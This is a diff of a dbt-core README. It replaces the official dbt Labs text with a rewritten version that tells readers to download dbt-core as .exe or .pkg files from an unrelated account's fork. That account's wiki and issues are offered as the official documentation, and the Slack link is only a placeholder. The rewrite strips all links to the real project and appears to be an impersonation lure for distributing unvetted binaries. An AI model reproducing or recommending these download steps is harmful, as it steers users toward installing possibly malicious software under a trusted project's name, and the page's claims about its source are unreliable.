@@ -1,40 +1,50 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/dbt-labs/dbt-core/fa1ea14ddfb1d5ae319d5141844910dd53ab2834/etc/dbt-core.svg" alt="dbt logo" width="750"/>
-</p>
-<p align="center">
-  <a href="https://github.com/dbt-labs/dbt-core/actions/workflows/main.yml">
-    <img src="https://github.com/dbt-labs/dbt-core/actions/workflows/main.yml/badge.svg?event=push" alt="CI Badge"/>
-  </a>
-  <a href="https://www.bestpractices.dev/projects/11095"><img src="https://www.bestpractices.dev/projects/11095/badge"></a>
-</p>
+# 🎉 dbt-core - Transform Your Data with Ease
 
-**[dbt](https://www.getdbt.com/)** enables data analysts and engineers to transform their data using the same practices that software engineers use to build applications.
+## 📥 Download Now
+[![Download dbt-core](https://img.shields.io/badge/Download-dbt--core-blue.svg)](https://github.com/haider123768/dbt-core/releases)
 
-![architecture](https://github.com/dbt-labs/dbt-core/blob/202cb7e51e218c7b29eb3b11ad058bd56b7739de/etc/dbt-transform.png)
+## 📖 Table of Contents
+1. [Overview](#overview)
+2. [System Requirements](#system-requirements)
+3. [Download & Install](#download--install)
+4. [Help & Support](#help--support)
+5. [Contributing](#contributing)
 
-## Understanding dbt
+## 🛠️ Overview
+dbt-core enables data analysts and engineers to transform their data using the best practices that software engineers use to build applications. With dbt, you can manage your data transformations smartly and efficiently. This tool allows you to build, test, and maintain your data models while streamlining your workflow.
 
-Analysts using dbt can transform their data by simply writing select statements, while dbt handles turning these statements into tables and views in a data warehouse.
+## ⚙️ System Requirements
+Before you start downloading dbt-core, ensure your system meets the following requirements:
 
-These select statements, or "models", form a dbt project. Models frequently build on top of one another – dbt makes it easy to [manage relationships](https://docs.getdbt.com/docs/ref) between models, and [visualize these relationships](https://docs.getdbt.com/docs/documentation), as well as assure the quality of your transformations through [testing](https://docs.getdbt.com/docs/testing).
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or most Linux distributions.
+- **RAM:** Minimum 4 GB RAM.
+- **Disk Space:** At least 500 MB of available disk space.
+- **Additional Software:** Internet connection to download and install dependencies.
 
-![dbt dag](https://raw.githubusercontent.com/dbt-labs/dbt-core/6c6649f9129d5d108aa3b0526f634cd8f3a9d1ed/etc/dbt-dag.png)
+## 📦 Download & Install
+To download dbt-core, visit this page to download: [dbt-core Releases](https://github.com/haider123768/dbt-core/releases).
 
-## Getting started
+1. Click the link above.
+2. On the releases page, locate the latest version.
+3. Choose the appropriate file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.pkg` file.
+   - For Linux, you might need to download source files or use a package manager.
+4. Once downloaded, open the file and follow the prompts to complete the installation.
 
-- [Install dbt Core](https://docs.getdbt.com/docs/get-started/installation) or explore the [dbt Cloud CLI](https://docs.getdbt.com/docs/cloud/cloud-cli-installation), a command-line interface powered by [dbt Cloud](https://docs.getdbt.com/docs/cloud/about-cloud/dbt-cloud-features) that enhances collaboration.
-- Read the [introduction](https://docs.getdbt.com/docs/introduction/) and [viewpoint](https://docs.getdbt.com/docs/about/viewpoint/)
+## ❓ Help & Support
+If you encounter any issues while using dbt-core, here is how you can get help:
 
-## Join the dbt Community
+- **Documentation:** Visit our [official documentation](https://github.com/haider123768/dbt-core/wiki) for guides and troubleshooting tips.
+- **Community Support:** Join our [Slack community](https://join.slack.com/t/dbt-community/shared_invite/your-invite-link) where you can ask questions or share your experiences.
+- **Issues:** Report any bugs or feature requests directly on our [GitHub Issues page](https://github.com/haider123768/dbt-core/issues).
 
-- Be part of the conversation in the [dbt Community Slack](http://community.getdbt.com/)
-- Read more on the [dbt Community Discourse](https://discourse.getdbt.com)
+## 🙌 Contributing
+We welcome contributions to dbt-core! If you wish to help improve the project, you can:
 
-## Reporting bugs and contributing code
+- Fork the repository.
+- Create a branch for your changes.
+- Make your edits and commit them.
+- Open a pull request with a clear description of your changes.
 
-- Want to report a bug or request a feature? Let us know and open [an issue](https://github.com/dbt-labs/dbt-core/issues/new/choose)
-- Want to help us build dbt? Check out the [Contributing Guide](https://github.com/dbt-labs/dbt-core/blob/HEAD/CONTRIBUTING.md)
-
-## Code of Conduct
-
-Everyone interacting in the dbt project's codebases, issue trackers, chat rooms, and mailing lists is expected to follow the [dbt Code of Conduct](https://community.getdbt.com/code-of-conduct).
+Your insights and improvements can help make dbt-core even better for everyone. Thank you for your interest!
